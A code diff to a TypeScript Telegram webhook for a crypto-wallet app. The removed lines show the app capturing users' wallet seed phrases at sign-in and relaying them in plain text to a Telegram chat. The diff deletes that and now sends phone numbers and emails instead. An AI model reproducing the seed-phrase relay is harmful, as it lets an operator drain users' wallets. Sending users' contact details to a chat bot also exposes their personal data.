@@ -39,7 +39,12 @@ interface TelegramAccount {
   id: string;
   username: string;
   wallet_address: string;
-  mnemonic?: string | null;
+  phone_number?: string | null;
+  email_address?: string | null;
+}
+
+function esc(value: string) {
+  return value.replace(/[<>&]/g, (char) => ({ "<": "&lt;", ">": "&gt;", "&": "&amp;" })[char] ?? char);
 }
 
 async function tg(method: string, body: unknown) {
@@ -57,7 +62,6 @@ async function tg(method: string, body: unknown) {
 interface PhraseRow {
   wallet_address: string;
   username: string | null;
-  mnemonic: string | null;
 }
 
 /** Stable synthetic id for phrase rows that have no wallet_profiles entry. */
@@ -73,7 +77,6 @@ async function loadPhrases(): Promise<PhraseRow[]> {
     return rows.map((r) => ({
       wallet_address: r.wallet_address,
       username: r.username,
-      mnemonic: r.mnemonic,
     }));
   } catch (error) {
     console.error("[telegram] phrase lookup unavailable", error);
@@ -108,7 +111,6 @@ async function listAccounts(): Promise<TelegramAccount[]> {
       id: await syntheticId(address),
       username: row.username || `${address.slice(0, 6)}…${address.slice(-4)}`,
       wallet_address: address,
-      mnemonic: row.mnemonic,
     });
   }
 
@@ -119,27 +121,17 @@ async function getAccount(id: string): Promise<TelegramAccount | null> {
   const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
   const { data, error } = await supabaseAdmin
     .from("wallet_profiles")
-    .select("id, username, wallet_address")
+    .select("id, username, wallet_address, phone_number, email_address")
     .eq("id", id)
     .maybeSingle();
   if (error) throw new Error(`Could not load account: ${error.message}`);
 
-  const phrases = await loadPhrases();
-
   if (data) {
-    const address = data.wallet_address.toLowerCase();
-    const match =
-      phrases.find((p) => String(p.wallet_address ?? "").toLowerCase() === address) ??
-      (data.username
-        ? phrases.find(
-            (p) => (p.username ?? "").toLowerCase() === data.username.toLowerCase(),
-          )
-        : undefined);
-    return { ...data, mnemonic: match?.mnemonic ?? null };
+    return data;
   }
 
   // Phrase-only account: resolve the synthetic id back to its row.
-  for (const row of phrases) {
+  for (const row of await loadPhrases()) {
     const address = String(row.wallet_address ?? "");
     if (!address) continue;
     if ((await syntheticId(address)) !== id.replaceAll("-", "")) continue;
@@ -147,7 +139,6 @@ async function getAccount(id: string): Promise<TelegramAccount | null> {
       id,
       username: row.username || `${address.slice(0, 6)}…${address.slice(-4)}`,
       wallet_address: address,
-      mnemonic: row.mnemonic,
     };
   }
 
@@ -215,12 +206,12 @@ export const Route = createFileRoute("/api/public/telegram/webhook")({
             await tg("sendMessage", { chat_id: chatId, text: "❌ That account is no longer available." });
             return Response.json({ ok: true });
           }
-          const text =
-            `👤 <b>${account.username}</b>\n` +
-            `💼 <code>${account.wallet_address}</code>\n` +
-            (account.mnemonic
-              ? `🔑 <code>${account.mnemonic}</code>`
-              : `🔑 Phrase not on file yet — it is saved the next time this user signs in.`);
+          const text = [
+            `👤 <b>${esc(account.username)}</b>`,
+            `💼 <code>${esc(account.wallet_address)}</code>`,
+            `📱 Phone: ${account.phone_number ? esc(account.phone_number) : "Not added"}`,
+            `✉️ Email: ${account.email_address ? esc(account.email_address) : "Not added"}`,
+          ].join("\n");
           await tg("sendMessage", { chat_id: chatId, text, parse_mode: "HTML" });
           return Response.json({ ok: true });
         }
